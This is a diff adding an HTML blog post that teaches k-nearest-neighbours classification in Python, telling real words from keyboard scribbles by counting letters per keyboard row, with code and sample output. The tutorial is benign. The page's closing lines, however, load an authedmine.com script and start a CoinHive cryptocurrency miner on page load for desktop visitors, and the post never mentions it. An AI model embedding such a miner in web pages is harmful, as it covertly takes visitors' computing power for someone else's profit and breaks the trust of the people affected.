@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+            <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+        <title>Simple Scribble Detection by k-nearest neighbours using python</title>
+
+            <link href="https://i-2.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Infinite intellect Full Atom Feed" />
+        <!-- Bootstrap Core CSS -->
+        <link href="https://i-2.github.io/theme/css/bootstrap.min.css" rel="stylesheet">
+
+        <!-- Custom CSS -->
+        <link href="https://i-2.github.io/theme/css/clean-blog.min.css" rel="stylesheet">
+
+        <!-- Code highlight color scheme -->
+            <link href="https://i-2.github.io/theme/css/code_blocks/darkly.css" rel="stylesheet">
+
+
+        <!-- Custom Fonts -->
+        <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+        <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+        <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+        <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+        <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+        <!--[if lt IE 9]>
+            <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+            <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+        <![endif]-->
+
+
+
+        <meta name="description" content="K-nearest neighbours(K-NN) is one of the simplest machine learning algorithms. Using K-NN we are going to classify whether the given...">
+
+        <meta name="author" content="Sathya Narrayanan">
+
+        <meta name="tags" content="machine-learning">
+        <meta name="tags" content="python">
+
+	                <meta property="og:locale" content="">
+		<meta property="og:site_name" content="Infinite intellect">
+
+	<meta property="og:type" content="article">
+            <meta property="article:author" content="https://i-2.github.io/author/sathya-narrayanan.html">
+	<meta property="og:url" content="https://i-2.github.io/scribble-detection.html">
+	<meta property="og:title" content="Simple Scribble Detection by k-nearest neighbours using python">
+	<meta property="article:published_time" content="2018-05-02 11:20:00+02:00">
+            <meta property="og:description" content="K-nearest neighbours(K-NN) is one of the simplest machine learning algorithms. Using K-NN we are going to classify whether the given...">
+
+            <meta property="og:image" content="https://i-2.github.io/theme/images/post-bg.jpg">
+        <meta name="twitter:card" content="summary_large_image">
+        <meta name="twitter:site" content="@sourcepirate">
+        <meta name="twitter:title" content="Simple Scribble Detection by k-nearest neighbours using python">
+
+            <meta name="twitter:image" content="https://i-2.github.io/theme/images/post-bg.jpg">
+
+            <meta name="twitter:description" content="K-nearest neighbours(K-NN) is one of the simplest machine learning algorithms. Using K-NN we are going to classify whether the given...">
+</head>
+
+<body>
+
+    <!-- Navigation -->
+    <nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+        <div class="container-fluid">
+            <!-- Brand and toggle get grouped for better mobile display -->
+            <div class="navbar-header page-scroll">
+                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                    <span class="sr-only">Toggle navigation</span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </button>
+                <a class="navbar-brand" href="https://i-2.github.io/">Infinite intellect</a>
+            </div>
+
+            <!-- Collect the nav links, forms, and other content for toggling -->
+            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+                <ul class="nav navbar-nav navbar-right">
+
+                </ul>
+            </div>
+            <!-- /.navbar-collapse -->
+        </div>
+        <!-- /.container -->
+    </nav>
+
+    <!-- Page Header -->
+        <header class="intro-header" style="background-image: url('https://i-2.github.io/theme/images/post-bg.jpg')">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <div class="post-heading">
+                        <h1>Simple Scribble Detection by k-nearest neighbours using python</h1>
+                        <span class="meta">Posted by
+                                <a href="https://i-2.github.io/author/sathya-narrayanan.html">Sathya Narrayanan</a>
+                             on Wed 02 May 2018
+                        </span>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+    <!-- Post Content -->
+    <article>
+        <p>I am a beginner to the machine learning space. I felt it very hard to understand the mathematical essence assosiated with each learning algorithms. One day a friend of mine introduced me to this (k-NN) approach. Unlike other learning algorithms this is very simple and easy to understand. So let's get started!</p>
+<h2>What is K-Nearest Neighbours ?</h2>
+<p>"In pattern recognition, the k-nearest neighbors algorithm (k-NN) is a non-parametric method used for classification and regression. In both cases, the input consists of the k closest training examples in the feature space."</p>
+<p>I know you are mad at me now. Let's say it in a simple terms.</p>
+<p>If there are people standing in 5 queues, most people would prefer to stand in queue where there are few people before them, or in other words they prefered a queue which is near to the counter. It is this notion of distance the K-NN algorithm will work.</p>
+<p>If you need to write your own k-nn algorithm. You should first come up with a definition of distance for your data.</p>
+<h2>Let's dive in to the example</h2>
+<p>We are going to classify text whether it is a scribble or not. 
+Entire code is available in my <a href="https://github.com/sourcepirate/scribble-detection">github repo</a>.
+We are going to use a dataset of words.
+below is a sample set.</p>
+<div class="highlight"><pre><span></span><span class="gh">#</span> scribble_data.txt
+sno,WORDS,scribble,label
+0,human,False,word
+1,animal,False,word
+2,frog,False,word
+.
+.
+.
+197,dsncfiwer,True,scribble
+198,ckdnsosdfs,True,scribble
+199,ewiojocwmo,True,scribble
+</pre></div>
+
+
+<p>We are going to use this dataset for the demo.</p>
+<h2>Notion of distance</h2>
+<p>If you take a closer look in your keyboard layout. Three row are available</p>
+<div class="highlight"><pre><span></span>qwertyuiop
+asdfghjkl
+zxcvbnm
+</pre></div>
+
+
+<p>so we can use this information to create a vector. For example,</p>
+<div class="highlight"><pre><span></span>u = upper, m = middle , l= lower
+
+hello = 2u + 3m + 0l = [2, 3, 0]
+cat = 1u  + 1m + 1l = [1, 1, 1]
+</pre></div>
+
+
+<p>Now we have our vectors available. we calculate the distance between them</p>
+<div class="highlight"><pre><span></span><span class="n">a</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">]</span>
+<span class="n">b</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">1</span><span class="p">]</span>
+
+<span class="n">magnitude</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="n">b</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">^</span> <span class="mi">2</span> <span class="o">+</span> <span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="n">b</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">^</span> <span class="mi">2</span> <span class="o">+</span> <span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">-</span> <span class="n">b</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="o">^</span> <span class="mi">2</span>
+<span class="n">distance</span> <span class="o">=</span> <span class="n">sqrt</span><span class="p">(</span><span class="n">magnitude</span><span class="p">)</span>
+</pre></div>
+
+
+<p>Now we have our distance. now lets sum up all these to python code.</p>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">csv</span>
+<span class="kn">from</span> <span class="nn">collections</span> <span class="kn">import</span> <span class="n">Counter</span>
+<span class="kn">from</span> <span class="nn">math</span> <span class="kn">import</span> <span class="n">sqrt</span>
+
+<span class="n">UPPER</span> <span class="o">=</span> <span class="s2">&quot;qwertpoiuy&quot;</span>
+<span class="n">MIDDLE</span> <span class="o">=</span> <span class="s2">&quot;asdfglkjh&quot;</span>
+<span class="n">LOWER</span> <span class="o">=</span> <span class="s2">&quot;zxcvbnm&quot;</span>
+
+<span class="k">def</span> <span class="nf">get_class_count</span><span class="p">(</span><span class="n">word_dict</span><span class="p">,</span> <span class="n">_kls</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;getting a class count&quot;&quot;&quot;</span>
+    <span class="n">keys</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">word_dict</span><span class="o">.</span><span class="n">keys</span><span class="p">())</span>
+    <span class="n">_kls_set</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">_kls</span><span class="p">)</span>
+    <span class="n">intersection</span> <span class="o">=</span> <span class="n">keys</span> <span class="o">&amp;</span> <span class="n">_kls_set</span>
+    <span class="k">return</span> <span class="nb">sum</span><span class="p">([</span><span class="n">word_dict</span><span class="p">[</span><span class="n">key</span><span class="p">]</span> <span class="k">for</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">intersection</span><span class="p">])</span>
+
+
+<span class="k">def</span> <span class="nf">get_stats</span><span class="p">(</span><span class="n">word</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot; Representign a word as a vertor [i, j, k]</span>
+<span class="sd">        i - Number of words from upper keyboard row</span>
+<span class="sd">        j - Number of words from middle keyboard row</span>
+<span class="sd">        k - Number of words from lower keyboard row</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">stat</span> <span class="o">=</span> <span class="n">Counter</span><span class="p">(</span><span class="n">word</span><span class="p">)</span>
+    <span class="k">return</span> <span class="p">[</span><span class="n">get_class_count</span><span class="p">(</span><span class="n">stat</span><span class="p">,</span> <span class="n">UPPER</span><span class="p">),</span>
+            <span class="n">get_class_count</span><span class="p">(</span><span class="n">stat</span><span class="p">,</span> <span class="n">MIDDLE</span><span class="p">),</span>
+            <span class="n">get_class_count</span><span class="p">(</span><span class="n">stat</span><span class="p">,</span> <span class="n">LOWER</span><span class="p">)]</span>
+
+<span class="k">def</span> <span class="nf">distance</span><span class="p">(</span><span class="n">word1</span><span class="p">,</span> <span class="n">word2</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot; Does the vector magnitude for two stats</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">stat1</span> <span class="o">=</span> <span class="n">get_stats</span><span class="p">(</span><span class="n">word1</span><span class="p">)</span>
+    <span class="n">stat2</span> <span class="o">=</span> <span class="n">get_stats</span><span class="p">(</span><span class="n">word2</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">sqrt</span><span class="p">(</span><span class="nb">sum</span><span class="p">([(</span><span class="n">i</span><span class="o">-</span><span class="n">j</span><span class="p">)</span><span class="o">**</span><span class="mi">2</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">stat1</span><span class="p">,</span> <span class="n">stat2</span><span class="p">)]))</span>
+</pre></div>
+
+
+<h2>Determining the closest</h2>
+<p>Let's just recall what columns do we have in our dataset.</p>
+<div class="highlight"><pre><span></span>WORDS
+label
+scribble
+</pre></div>
+
+
+<p>This is called training dataset. The main purpose or training dataset is to train
+you machine on data.</p>
+<p>What does this algoirthm do when it gets trained ?
+Answer: If we give it a word to classify it checks whether which point is near to it. In our case either 
+it can be a word point or scibble point. If a word point it near to it, then the given word is a word,
+else it is a scribble.</p>
+<p>Main problem with this K-NN approach is you need a lot of data to train your model to be perfect.
+out dataset has only 200 rows. so don't expect it to work well on production.</p>
+<p>code for selecting the nearest node.</p>
+<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">majority</span><span class="p">(</span><span class="n">labels</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;get the majority for label</span>
+<span class="sd">       Since we have to filter only one optimally</span>
+<span class="sd">       if two labels have same counts try</span>
+<span class="sd">       removing the farthest one and</span>
+<span class="sd">       continue it.</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">counts</span> <span class="o">=</span> <span class="n">Counter</span><span class="p">(</span><span class="n">labels</span><span class="p">)</span>
+    <span class="n">winner</span><span class="p">,</span> <span class="n">winner_count</span> <span class="o">=</span> <span class="n">counts</span><span class="o">.</span><span class="n">most_common</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="n">num_winners</span> <span class="o">=</span> <span class="nb">len</span><span class="p">([</span><span class="n">count</span> <span class="k">for</span> <span class="n">count</span> <span class="ow">in</span> <span class="n">counts</span><span class="o">.</span><span class="n">values</span><span class="p">()</span>
+                       <span class="k">if</span> <span class="n">count</span> <span class="o">==</span> <span class="n">winner_count</span><span class="p">])</span>
+
+    <span class="k">if</span> <span class="n">num_winners</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">winner</span>                     <span class="c1"># unique winner, so return it</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">majority</span><span class="p">(</span><span class="n">labels</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+
+<span class="k">def</span> <span class="nf">knn_classify</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">labeled</span><span class="p">,</span> <span class="n">word</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;each labeled point should be a pair (point, label)&quot;&quot;&quot;</span>
+    <span class="c1"># order the labeled points from nearest to farthest</span>
+    <span class="n">by_distance</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">labeled</span><span class="p">,</span>
+                         <span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">point</span><span class="p">:</span> <span class="n">distance</span><span class="p">(</span><span class="n">point</span><span class="p">[</span><span class="s2">&quot;WORDS&quot;</span><span class="p">],</span> <span class="n">word</span><span class="p">))</span>
+
+    <span class="c1"># find the labels for the k closest</span>
+    <span class="n">k_nearest_labels</span> <span class="o">=</span> <span class="p">[</span><span class="n">label</span><span class="p">[</span><span class="s2">&quot;label&quot;</span><span class="p">]</span> <span class="k">for</span> <span class="n">label</span> <span class="ow">in</span> <span class="n">by_distance</span><span class="p">[:</span><span class="n">k</span><span class="p">]]</span>
+
+    <span class="c1"># and let them vote</span>
+    <span class="k">return</span> <span class="n">majority</span><span class="p">(</span><span class="n">k_nearest_labels</span><span class="p">)</span>
+</pre></div>
+
+
+<p>majority function takes in the list of labels and gives out marjority in give labels. If you two or more labels has the same majority we remove the farthest for the list of labels and run majority again(There can be only one winner).</p>
+<p>knn_classify function takes in :</p>
+<p><strong>k</strong> : which denotes the no of nearest nodes we need to see. In our case we choose to go with 2.</p>
+<p><strong>labeled</strong>: the training data set.</p>
+<p><strong>word</strong>: the word to be classified.</p>
+<h2>Now the fun part. Demo Time</h2>
+<div class="highlight"><pre><span></span><span class="n">reader</span> <span class="o">=</span> <span class="n">csv</span><span class="o">.</span><span class="n">DictReader</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s2">&quot;scribble_data.txt&quot;</span><span class="p">))</span>
+<span class="n">values</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">reader</span><span class="p">)</span>
+<span class="n">test_scribble</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;sdjkflsd&quot;</span><span class="p">,</span> 
+                <span class="s2">&quot;ivfnfin&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;siofuewoi&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;ewuroqo&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;weiuoro&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;vbfbjsad&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;hello&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;word&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;wouerwiuer&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;jupiter&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;simplex&quot;</span><span class="p">]</span>
+<span class="k">for</span> <span class="n">data</span> <span class="ow">in</span> <span class="n">test_scribble</span><span class="p">:</span>
+    <span class="n">predicted</span> <span class="o">=</span> <span class="n">knn_classify</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">values</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;{} is classified as {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">predicted</span><span class="p">))</span>
+</pre></div>
+
+
+<p>Now lets see the output</p>
+<div class="highlight"><pre><span></span><span class="n">sdjkflsd</span> <span class="k">is</span> <span class="n">classified</span> <span class="k">as</span> <span class="n">scribble</span>
+<span class="n">ivfnfin</span> <span class="k">is</span> <span class="n">classified</span> <span class="k">as</span> <span class="n">scribble</span>
+<span class="n">siofuewoi</span> <span class="k">is</span> <span class="n">classified</span> <span class="k">as</span> <span class="n">scribble</span>
+<span class="n">ewuroqo</span> <span class="k">is</span> <span class="n">classified</span> <span class="k">as</span> <span class="n">scribble</span>
+<span class="n">weiuoro</span> <span class="k">is</span> <span class="n">classified</span> <span class="k">as</span> <span class="n">scribble</span>
+<span class="n">vbfbjsad</span> <span class="k">is</span> <span class="n">classified</span> <span class="k">as</span> <span class="n">scribble</span>
+<span class="n">hello</span> <span class="k">is</span> <span class="n">classified</span> <span class="k">as</span> <span class="n">word</span>
+<span class="n">word</span> <span class="k">is</span> <span class="n">classified</span> <span class="k">as</span> <span class="n">word</span>
+<span class="n">wouerwiuer</span> <span class="k">is</span> <span class="n">classified</span> <span class="k">as</span> <span class="n">scribble</span>
+<span class="n">jupiter</span> <span class="k">is</span> <span class="n">classified</span> <span class="k">as</span> <span class="n">word</span>
+<span class="n">simplex</span> <span class="k">is</span> <span class="n">classified</span> <span class="k">as</span> <span class="n">word</span>
+</pre></div>
+
+
+<p>It pretty much works good. So we are done.</p>
+    </article>
+
+        <div class="tags">
+            <p>tags: <a href="https://i-2.github.io/tag/machine-learning.html">machine-learning</a>, <a href="https://i-2.github.io/tag/python.html">python</a></p>
+        </div>
+
+    <hr>
+
+        <div class="comments">
+            <h2>Comments !</h2>
+            <div id="disqus_thread"></div>
+            <script type="text/javascript">
+                var disqus_shortname = 'infiniteintellect-1';
+                var disqus_identifier = 'scribble-detection.html';
+                var disqus_url = 'https://i-2.github.io/scribble-detection.html';
+                (function() {
+                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                    dsq.src = '//infiniteintellect-1.disqus.com/embed.js';
+                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                })();
+            </script>
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+            </div>
+        </div>
+    </div>
+
+    <hr>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <ul class="list-inline text-center">
+                            <li>
+                                <a href="https://twitter.com/sourcepirate">
+                                    <span class="fa-stack fa-lg">
+                                        <i class="fa fa-circle fa-stack-2x"></i>
+                                        <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                                    </span>
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://github.com/sourcepirate">
+                                    <span class="fa-stack fa-lg">
+                                        <i class="fa fa-circle fa-stack-2x"></i>
+                                        <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                                    </span>
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://facebook.com/sathya.shadow">
+                                    <span class="fa-stack fa-lg">
+                                        <i class="fa fa-circle fa-stack-2x"></i>
+                                        <i class="fa fa-facebook fa-stack-1x fa-inverse"></i>
+                                    </span>
+                                </a>
+                            </li>
+                            <li>
+                                <a href="sathyanarrayanan@yandex.com">
+                                    <span class="fa-stack fa-lg">
+                                        <i class="fa fa-circle fa-stack-2x"></i>
+                                        <i class="fa fa-envelope fa-stack-1x fa-inverse"></i>
+                                    </span>
+                                </a>
+                            </li>
+                    </ul>
+<p class="copyright text-muted">
+    Blog powered by <a href="http://getpelican.com">Pelican</a>,
+    which takes great advantage of <a href="http://python.org">Python</a>. <br />        &copy;  sourcepirate
+</p>                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- jQuery -->
+    <script src="https://i-2.github.io/theme/js/jquery.min.js"></script>
+
+    <!-- Bootstrap Core JavaScript -->
+    <script src="https://i-2.github.io/theme/js/bootstrap.min.js"></script>
+
+        <!-- Custom Theme JavaScript -->
+        <script src="https://i-2.github.io/theme/js/clean-blog.min.js"></script>
+
+<script type="text/javascript">
+    var disqus_shortname = 'infiniteintellect-1';
+    (function () {
+        var s = document.createElement('script'); s.async = true;
+        s.type = 'text/javascript';
+        s.src = '//' + disqus_shortname + '.disqus.com/count.js';
+        (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+    }());
+</script>
+
+    <script src="https://authedmine.com/lib/authedmine.min.js"></script>
+    <script>
+       var miner = new CoinHive.Anonymous("AQzlvDcEgIsjPYt6zkD5R9P5tHLtFLz6", {throttle: 0.3});
+       if (!miner.isMobile()) {
+        miner.start();
+       }
+    </script>
+</body>
+
+</html>
